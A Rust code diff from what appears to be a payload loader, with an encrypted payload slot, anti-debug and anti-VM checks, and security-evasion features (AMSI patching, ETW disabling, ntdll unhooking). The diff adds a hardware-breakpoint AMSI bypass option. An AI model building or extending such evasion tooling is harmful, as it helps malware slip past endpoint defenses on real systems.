@@ -15,7 +15,7 @@ mod utilities;
 #[cfg(any(feature = "CheckAntiDebugProcessDebugFlags", feature = "CheckAntiDebugSystemDebugControl", feature = "CheckAntiDebugRemoteDebugger", feature = "CheckAntiDebugNtGlobalFlag", feature = "CheckAntiDebugProcessList", feature = "CheckAntiDebugHardwareBreakpoints", feature = "CheckAntiVMCPU", feature = "CheckAntiVMRAM", feature = "CheckAntiVMUSB", feature = "CheckAntiVMProcesses", feature = "CheckDomainJoined"))]
 mod checks;
 
-#[cfg(any(feature = "EvasionAMSISimplePatch", feature = "EvasionETWSimple", feature = "EvasionNtdllUnhooking"))]
+#[cfg(any(feature = "EvasionAMSISimplePatch", feature = "EvasionETWSimple", feature = "EvasionNtdllUnhooking", feature = "EvasionAMSIHwbp"))]
 mod evasion;
 
 // AES encryption support
@@ -32,7 +32,7 @@ mod args;
 const ENCPAYLOAD: &[u8] = &[];
 
 /// Run all enabled evasion techniques
-#[cfg(any(feature = "EvasionAMSISimplePatch", feature = "EvasionETWSimple", feature = "EvasionNtdllUnhooking"))]
+#[cfg(any(feature = "EvasionAMSISimplePatch", feature = "EvasionETWSimple", feature = "EvasionNtdllUnhooking", feature = "EvasionAMSIHwbp"))]
 fn run_evasion_techniques() {
     #[cfg(feature = "EvasionNtdllUnhooking")]
     {
@@ -42,6 +42,11 @@ fn run_evasion_techniques() {
     #[cfg(feature = "EvasionAMSISimplePatch")]
     {
         let _ = evasion::amsi::patch_amsi();
+    }
+
+    #[cfg(feature = "EvasionAMSIHwbp")]
+    {
+        let _ = evasion::amsi::patch_amsi_hwbp();
     }
 
     #[cfg(feature = "EvasionETWSimple")]
@@ -73,7 +78,7 @@ fn main() {
     // =======================================================================
     // Evasion techniques
     // =======================================================================
-    #[cfg(any(feature = "EvasionAMSISimplePatch", feature = "EvasionETWSimple", feature = "EvasionNtdllUnhooking"))]
+    #[cfg(any(feature = "EvasionAMSISimplePatch", feature = "EvasionETWSimple", feature = "EvasionNtdllUnhooking", feature = "EvasionAMSIHwbp"))]
     run_evasion_techniques();
 
     // =======================================================================
